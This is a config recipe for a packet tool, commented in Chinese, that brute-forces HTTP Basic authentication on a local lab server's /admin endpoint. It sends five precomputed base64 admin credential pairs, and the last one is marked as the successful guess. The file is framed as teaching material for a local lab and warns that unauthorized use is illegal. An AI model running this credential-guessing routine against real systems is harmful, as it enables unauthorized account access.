# HTTP Basic 认证爆破 · 客户端配方（basic.pktl）：对本机靶场 lab_server.py 的
# /admin 端点逐个试预计算好的 Basic 凭据（RFC 7617：Basic base64(user:pass)，
# DSL 无 base64 原语，候选离线算好后按「明文对 → 完整头行」写进每步 params）。
#
# 每步结构同 form.pktl（delay 低速 / wait 读响应 / on_error 兜底）；
# 区别只在凭据位置：表单在查询串（form_attempt.pkt），Basic 在 Authorization 头
# （basic_attempt.pkt）——「凭据藏在哪，爆破就构造哪」。
#
# 运行（先起靶场）：python3 examples/brute_http/lab_server.py
#   prping packet examples/brute_http/basic.pktl 127.0.0.1:8000
#
# ⚠ 仅限授权环境/本机靶场。对未授权目标使用属违法行为。
recipe:
# admin:admin    → base64("admin:admin")    = YWRtaW46YWRtaW4=
- packet: basic_attempt.pkt
  params: auth=Authorization: Basic YWRtaW46YWRtaW4=
  wait: 2
  delay: 0.5
  on_error: continue
# admin:123456   → base64("admin:123456")   = YWRtaW46MTIzNDU2
- packet: basic_attempt.pkt
  params: auth=Authorization: Basic YWRtaW46MTIzNDU2
  wait: 2
  delay: 0.5
  on_error: continue
# admin:password → base64("admin:password") = YWRtaW46cGFzc3dvcmQ=
- packet: basic_attempt.pkt
  params: auth=Authorization: Basic YWRtaW46cGFzc3dvcmQ=
  wait: 2
  delay: 0.5
  on_error: continue
# admin:qwerty   → base64("admin:qwerty")   = YWRtaW46cXdlcnR5
- packet: basic_attempt.pkt
  params: auth=Authorization: Basic YWRtaW46cXdlcnR5
  wait: 2
  delay: 0.5
  on_error: continue
# admin:secret123 → base64("admin:secret123") = YWRtaW46c2VjcmV0MTIz  （命中）
- packet: basic_attempt.pkt
  params: auth=Authorization: Basic YWRtaW46c2VjcmV0MTIz
  wait: 2
